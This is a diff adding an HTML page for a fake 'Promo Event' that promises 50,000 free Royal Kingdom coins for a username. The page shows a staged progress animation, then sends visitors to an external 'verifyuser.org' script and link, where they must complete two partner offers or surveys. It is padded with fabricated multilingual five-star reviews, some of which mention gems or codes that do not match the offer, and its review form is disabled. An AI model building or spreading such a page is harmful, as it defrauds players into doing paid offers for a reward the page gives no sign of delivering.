@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script type="text/javascript" id="ogjs" src="https://verifyuser.org/cl/i/qkwr55"></script>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&amp;display=swap" rel="stylesheet">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promo Event</title>
+    <!-- Include external CSS -->
+    <link rel="stylesheet" href="css/style.css">
+    <!-- Include FontAwesome for icons -->
+    <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+</head>
+
+<body>
+    <!-- Notification Banner -->
+    <div id="notification" class="notification" style="display:none;">
+        <div class="notification-content">
+            <span id="notification-text">Notification text goes here.</span>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="banner-top">
+        <div class="fade-overlay">
+
+        </div>
+        <div class="logo">
+            <img src="img/logo.png" class="logo-img" alt="Promo Event"
+                style="width: 100%; max-width: 300px;"></img>
+        </div>
+    </div>
+    <!-- Logo -->
+
+    <main class="main-container">
+        <!-- Flex Container for Form and Right Column -->
+        <div class="flex-container">
+            <!-- Generator Section (Left Column) -->
+            <section class="generator-section">
+                <h1 class="title rr-font">Promo Event</h1>
+                <h3 class="subtitle">Claim 50000 Coins</h3>
+                <div id="step-1" class="step">
+                    <form id="promo-form">
+                        <!-- Username Input -->
+                        <div class="form-group">
+                            <label for="u" class="control-label">Royal Kingdom Username or ID</label>
+                            <div class="input-group">
+                                <div class="input-group-addon"><img src="img/usericon.png" alt="User Icon"></div>
+                                <input type="text" class="form-control" id="u" placeholder="Royal Kingdom username or ID">
+                            </div>
+                            <p class="text-danger" id="uerror" style="display:none;">Invalid username or ID</p>
+                        </div>
+
+                        <!-- Static Input (Offer) -->
+                        <div class="form-group">
+                            <label for="c" class="control-label">Event Offer: 50000 Coins</label>
+                            <div class="input-group">
+                                <div class="input-group-addon"><img src="img/cr1.png" alt="Coins Icon"></div>
+                                <input type="text" class="form-control" placeholder="50000 Coins" disabled>
+                            </div>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <div class="form-group">
+                            <button id="gen-start" class="btn rr-font" type="submit">Receive Gift</button>
+                        </div>
+
+
+                    </form>
+                </div>
+
+                <!-- Generator Process Section -->
+                <div id="step-2" class="step" style="display:none;">
+                    <div id="console-msg">Initializing...</div>
+                    <div id="console-progress" class="progress-bar"></div>
+                </div>
+                <!-- New Button to Show After Animation -->
+                <div class="form-group">
+                <button id="gen-complete" class="btn rr-font" type="button" onclick="location.href='https://verifyuser.org/cl/i/qkwr55';" style="display: none;">Claim Now!</button>
+                </div>
+            
+            </section>
+
+            <!-- Right Column (Status and Info Boxes) -->
+            <div class="right-column">
+                <!-- Status Section -->
+                <section class="status-section">
+                    <h2 class="rr-font">Status</h2>
+                    <div class="status-container">
+                        <!-- Status content will be updated here via JavaScript -->
+                    </div>
+                </section>
+
+                <!-- Info Box Section -->
+                <section class="info-section">
+                    <div class="card">
+                        <h2 class="card-title rr-font">Remember!</h2>
+                        <ol class="px-4">
+                            <li>You have to complete 2 offers to the end to receive the gift.</li>
+                            <li>After completing the offer, the gift will be unlocked.</li>
+                        </ol>
+                    </div>
+                </section>
+            </div>
+        </div>
+
+        <!-- New Row Section 1 -->
+        <div class="new-row">
+            <div class="card">
+                <h2 class="card-title rr-font">
+                    <center>How does this event work?</center>
+                </h2>
+                <div class="mt-2 text-sm text-bold">
+                    <div class="pool-desc text-bold">
+                        <center>For completing our partner surveys, we grant a one-time 50000 Coins promo gift.
+                        </center>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- New Row Section 2: Reviews and About Section -->
+        <div class="flex-container about-reviews">
+            <!--  Reviews Column -->
+            <div class="reviews-column">
+                <div class="card col-md-12" id="comments">
+                    <h2 class="card-title text-center rr-font">User Reviews <i class="fas fa-comment ml-2"></i></h2>
+                    <div class="comments-wrapper">
+                        <div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">Soulreaper77</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted a few hours
+                                            ago.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">31</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="Soulreaper77 rated this tool 5 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        Thank you sooo much! :D I've got my stuff quick!
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">Tankir</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted a few hours
+                                            ago.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">25</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="Tankir rated this tool 5 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        спбо спасб друзья!
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">LupoNero</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted a few minutes
+                                            ago.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">18</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="LupoNero rated this tool 5 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        Fantastico! Ho ricevuto subito le mie gemme!
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">YukiSama</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted an hour
+                                            ago.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">45</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="YukiSama rated this tool 4 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        最高！早くコードが届きました！
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">ElenaGamer</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted yesterday.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">12</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="ElenaGamer rated this tool 5 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        ¡Increíble! Las gemas llegaron enseguida.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">MaxVerde</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted 2 days
+                                            ago.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">28</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="MaxVerde rated this tool 4 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        Merci! Le code est arrivé rapidement.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!--<div class="comment-box">
+                            <div class="comment-content">
+                                <header class="comment-header">
+                                    <div class="comment-header-summary">
+                                        <span class="comment-author">HansD</span>
+                                        <span class="comment-date"><i class="far fa-clock"></i> Posted just now.</span>
+                                    </div>
+                                    <div class="comment-votes d-flex justify-content-around align-items-center">
+                                        <div class="vote-result comment-vote-result">22</div>
+                                        <button class="vote-btn comment-vote-plus">
+                                            <i class="fas fa-thumbs-up"></i>
+                                        </button>
+                                    </div>
+                                </header>
+                                <div class="comment-text">
+                                    <div class="comment-stars" title="HansD rated this tool 5 stars">
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                        <i class="fas fa-star star-gold"></i>
+                                    </div>
+                                    <div class="comment-message">
+                                        Super! Ich habe meine Kristalle sofort erhalten!
+                                    </div>
+                                </div>
+                            </div>
+                        </div>-->
+                    </div>
+                </div>
+            </div>
+
+            <!-- About Section -->
+            <div class="card container card-about" id="about">
+                <h2 class="card-title text-center mb-4 rr-font">Never give your account password during events!</h2>
+                <div class="row">
+                    <div class="col-sm-4 text-center">
+                        <div class="advantages-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <p class="text-bright text-sm">Never share your game password. During our events, we never ask
+                            for passwords, only ID to bind the Promo.</p>
+                    </div>
+                    <div class="col-sm-4 text-center">
+                        <div class="advantages-icon">
+                            <i class="fas fa-sync-alt"></i>
+                        </div>
+                        <p class="text-bright text-sm">The event Promo is valid one time per account.</p>
+                    </div>
+                    <div class="col-sm-4 text-center">
+                        <div class="advantages-icon">
+                            <i class="far fa-clock"></i>
+                        </div>
+                        <p class="text-bright text-sm">The event promo ends 30 December 2025.</p>
+                    </div>
+                </div>
+                <h3 class="card-title text-center mb-4 mt-5 rr-font">Free Royal Kingdom Promo Event!</h3>
+                <center>
+                    <p>Receive One-time 50000 Coins Promo Event for Royal Kingdom, FREE!</p>
+                    <p>Because we receive a small revenue from each survey completion from our third party partners,
+                        Royal Kingdom Coins are being rewarded in return. In addition, receiving the Promo
+                        is instant after survey completion. </p>
+                    <p>Thanks for your participation.</p>
+                </center>
+            </div>
+        </div>
+
+        <!-- Leave a Review Section -->
+        <section class="comments-section">
+            <h2>Leave a Review</h2>
+            <div class="comments-wrapper">
+                <!-- Comments will be appended here -->
+            </div>
+            <!-- Add Review Form -->
+            <div class="add-comment-form">
+                <input type="text" class="comment-add-username" placeholder="Your name" disabled>
+                <textarea class="comment-add-textarea" placeholder="Your review" disabled></textarea>
+                <div class="rating">
+                    <span>Rating:</span>
+                    <input type="number" class="vs-input-value" value="5" min="1" max="5" disabled>
+                </div>
+                <button class="comment-add-send" disabled>You must complete the offer to post a review</button>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Include JavaScript -->
+    <script src="js/app.js"></script>
+
+</body>
+
+</html>
